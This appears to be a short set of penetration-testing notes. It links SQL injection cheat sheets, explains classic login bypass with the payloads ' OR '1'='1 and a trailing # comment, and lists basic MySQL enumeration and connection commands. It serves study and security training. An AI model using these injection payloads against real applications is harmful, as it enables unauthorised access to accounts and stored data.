## Usfuel Cheat Sheets
- [MySQL SQL Injection](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) 
- [Oracle SQL Injection](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)  
- [PostgreSQL SQL Injection](https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)

## Classic SQL Injection
This is the most common type of SQL injection, where an attacker injects malicious SQL code into an application's input fields, typically through user inputs like forms or URL parameters.

```bash
' OR '1'='1
```
If the application does not properly sanitize input, the SQL query might look like this:
```bash
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'password';
```

Also, you can use **#** . The **#** character is used for commenting. So, if the line responsible for the login is: 
````bash
SELECT * FROM users WHERE user=\$user AND password=\$password
```` 
When we login on the page and enter user=Kill-9 and password=123, the executed statement will be: 
````bash
SELECT * FROM users WHERE user='Kill-9' AND password=$123
````
 If we input:
 ````bash
 user=Kill-9'#
````
The statement will be: 
````bash
SELECT * FROM users WHERE user='Kill-9'# AND password=$123
```` 
The commented part is not processed, granting us access.



## MySQL 

- Prints out the databases we can access:
````bash
SHOW databases;
````  

- Set to use the database named {database_name}:
````bash
USE {database_name};
````  

- Prints out the available tables inside the current database:

````bash
SHOW tables;
````  
- Prints out all the data from the table {table_name}:
````bash
SELECT * FROM {table_name};
````  


To connect:
````bash
mysql -h 10.129.42.201 -u root -p <password>
````


